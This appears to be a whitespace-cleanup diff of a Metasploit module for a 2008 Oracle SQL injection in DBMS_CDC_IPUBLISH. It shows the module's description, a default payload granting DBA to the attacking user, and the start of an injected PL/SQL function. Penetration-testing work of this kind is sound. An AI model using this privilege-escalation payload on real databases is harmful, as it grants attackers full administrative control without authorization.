@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -15,10 +19,10 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'SQL Injection via SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE',
 			'Description'    => %q{
-					The module exploits an sql injection flaw in the ALTER_HOTLOG_INTERNAL_CSOURCE 
-					procedure of the PL/SQL package DBMS_CDC_IPUBLISH. Any user with execute privilege 
-					on the vulnerable package can exploit this vulnerability. By default, users granted 
-					EXECUTE_CATALOG_ROLE have the required privilege.  Affected versions: Oracle Database 
+					The module exploits an sql injection flaw in the ALTER_HOTLOG_INTERNAL_CSOURCE
+					procedure of the PL/SQL package DBMS_CDC_IPUBLISH. Any user with execute privilege
+					on the vulnerable package can exploit this vulnerability. By default, users granted
+					EXECUTE_CATALOG_ROLE have the required privilege.  Affected versions: Oracle Database
 					Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU.
 			},
 			'Author'         => [ 'MC' ],
@@ -31,9 +35,9 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Oct 22 2008'))
 
-			register_options( 
+			register_options(
 				[
-					OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),					
+					OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
 				], self.class)
 	end
 
@@ -41,10 +45,10 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		return if not check_dependencies
 
-		name = Rex::Text.rand_text_alpha_upper(rand(10) + 1) 
+		name = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
 
 		function = "
-			CREATE OR REPLACE FUNCTION #{name} 
+			CREATE OR REPLACE FUNCTION #{name}
 			RETURN VARCHAR2 AUTHID CURRENT_USER
 			IS
 			PRAGMA AUTONOMOUS_TRANSACTION;
